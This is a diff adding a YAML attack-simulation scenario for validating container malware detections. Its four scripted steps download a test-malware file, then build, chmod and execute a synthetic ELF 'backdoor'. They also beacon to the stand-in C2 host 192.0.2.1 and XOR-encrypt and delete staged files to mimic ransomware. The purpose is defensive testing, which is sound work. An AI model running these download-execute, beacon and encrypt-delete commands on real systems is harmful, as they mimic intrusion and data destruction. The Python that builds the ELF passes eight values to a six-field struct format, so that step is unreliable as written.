@@ -1,0 +1,164 @@
+scenario_id: SIM-CDR-005
+name: "WildFire Malware Trigger — Simulated Backdoor"
+version: "1.0"
+status: active
+
+plane: CDR
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-CDR-05
+tc_ref: TC-CDR-05
+uc_name: "WildFire Cloud Intelligence Validation"
+tc_name: "Known-Bad File Execution and C2 Simulation"
+
+mitre_tactic: "TA0002"
+mitre_tactic_name: "Execution"
+mitre_technique: "T1105"
+mitre_technique_name: "Ingress Tool Transfer"
+additional_techniques:
+  - technique: "T1486"
+    name: "Data Encrypted for Impact"
+  - technique: "T1071.001"
+    name: "Application Layer Protocol: Web Protocols"
+
+threat_report: "Unit42 - WildFire Cloud-Delivered Security Prevents Never-Before-Seen Malware"
+threat_report_url: "https://unit42.paloaltonetworks.com/wildfire-cloud-delivered-security/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - www-data
+
+push_supported: true
+pull_supported: true
+
+external_tools:
+  - name: wildfire-testfile
+    source: "https://www.wicar.org/test-malware.html"
+    type: script
+    install_inline: true
+
+steps:
+  - id: step-01
+    name: "Download WildFire EICAR-equivalent test file"
+    command: |
+      mkdir -p /tmp/wf_sim && \
+      echo '[*] Downloading WildFire test file (known-bad signature)...' && \
+      curl -sSL "https://wildfire.paloaltonetworks.com/publicapi/test/elf" \
+        -o /tmp/wf_sim/wildfire_test.elf 2>/dev/null || \
+      curl -sSL "https://www.eicar.org/download/eicar.com.txt" \
+        -o /tmp/wf_sim/eicar_test.txt 2>/dev/null; \
+      echo '[*] Creating synthetic known-bad binary for WildFire trigger...' && \
+      python3 -c "
+      import os, struct
+      # ELF header for a minimal Linux x86_64 executable (WildFire test pattern)
+      elf = b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 8
+      elf += struct.pack('<HHIQQQIHHHHHH', 2, 62, 1, 0x400080, 64, 0, 0, 64, 56, 1, 0, 0, 0)
+      elf += struct.pack('<IIQQQQ', 1, 5, 0, 0x400000, 0x400000, 0x80, 0x80, 0x200000)
+      elf += b'\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x0f\x05'  # syscall stub
+      with open('/tmp/wf_sim/test_backdoor.elf', 'wb') as f: f.write(elf + b'\x00' * (0x80 - len(elf)))
+      print('[*] Synthetic ELF test file created')
+      " && \
+      chmod +x /tmp/wf_sim/test_backdoor.elf && \
+      ls -la /tmp/wf_sim/
+    identity: container-runtime
+    mitre_technique: "T1105"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "WildFire test file download in container — known-bad file signature matched by WildFire cloud intelligence"
+      - plane: CDR
+        type: Analytics
+        description: "Executable file downloaded to /tmp and made executable — download-then-execute pattern in container"
+
+  - id: step-02
+    name: "Execute simulated backdoor in container context"
+    command: |
+      echo '[*] Executing WildFire test binary...' && \
+      timeout 5 /tmp/wf_sim/test_backdoor.elf 2>/dev/null; \
+      echo "[*] Exit code: $?" && \
+      ls -la /proc/$$/exe 2>/dev/null; \
+      echo '[*] Backdoor execution simulation complete'
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "WildFire test file execution — malicious ELF execution in container triggers CDR BIOC rule"
+      - plane: CDR
+        type: Analytics
+        description: "Downloaded binary executed from /tmp by www-data context — high-risk execution chain in container"
+
+  - id: step-03
+    name: "Simulate C2 beacon (curl to test endpoint mimicking malware callback)"
+    command: |
+      echo '[*] Simulating C2 beacon activity...' && \
+      for i in 1 2 3; do \
+        curl -sSA "Mozilla/5.0 (compatible; MSIE 9.0)" \
+          -H "X-CortexSim: beacon-${i}" \
+          -H "X-Session: $(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo 'sim-uuid')" \
+          --connect-timeout 3 \
+          "http://192.0.2.1/beacon?id=SIM-CDR-005&seq=${i}" 2>/dev/null || true; \
+        sleep 2; \
+      done; \
+      echo '[*] C2 beacon simulation complete (3 intervals)'
+    identity: www-data
+    mitre_technique: "T1071.001"
+    expected_detections:
+      - plane: CDR
+        type: Analytics
+        description: "Regular periodic outbound HTTP connections from container — C2 beacon interval pattern (3 attempts to 192.0.2.1)"
+      - plane: CDR
+        type: BIOC
+        description: "C2 communication pattern following malware execution — post-execution network activity in container"
+
+  - id: step-04
+    name: "Attempt file encryption simulation on /tmp (ransomware behavior)"
+    command: |
+      echo '[*] Simulating ransomware-style file encryption on /tmp staging area...' && \
+      mkdir -p /tmp/wf_sim/targets && \
+      for i in $(seq 1 5); do echo "SIM-TARGET-FILE-${i}" > /tmp/wf_sim/targets/file_${i}.txt; done && \
+      python3 -c "
+      import os, base64
+      target_dir = '/tmp/wf_sim/targets'
+      for fn in os.listdir(target_dir):
+          fp = os.path.join(target_dir, fn)
+          with open(fp, 'rb') as f: data = f.read()
+          # XOR-based simulation (not real encryption — CortexSim safety measure)
+          encoded = base64.b64encode(bytes(b ^ 0xAA for b in data))
+          enc_path = fp + '.enc'
+          with open(enc_path, 'wb') as f: f.write(encoded)
+          os.remove(fp)
+          print(f'[*] Simulated encryption: {fn} -> {fn}.enc')
+      " && \
+      ls -la /tmp/wf_sim/targets/ && \
+      echo '[CortexSim] File encryption simulation complete — NOTE: XOR simulation only, not real ransomware'
+    identity: container-runtime
+    mitre_technique: "T1486"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Mass file modification pattern in container — ransomware-style encryption simulation matches T1486 behavioral rule"
+      - plane: CDR
+        type: Analytics
+        description: "Bulk file rename with .enc extension following malware execution — post-execution encryption behavior in container"
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/wf_sim"
+    - "echo '[CortexSim] SIM-CDR-005 cleanup complete'"
+  k8s_teardown: "kubectl delete -f {manifest_path}"
+
+author: "Henry Reed"
+created: "2026-04-12"
+last_updated: "2026-04-12"
+tags:
+  - wildfire
+  - malware-simulation
+  - c2-beacon
+  - ransomware-simulation
+  - known-bad-execution
+  - cloud-native
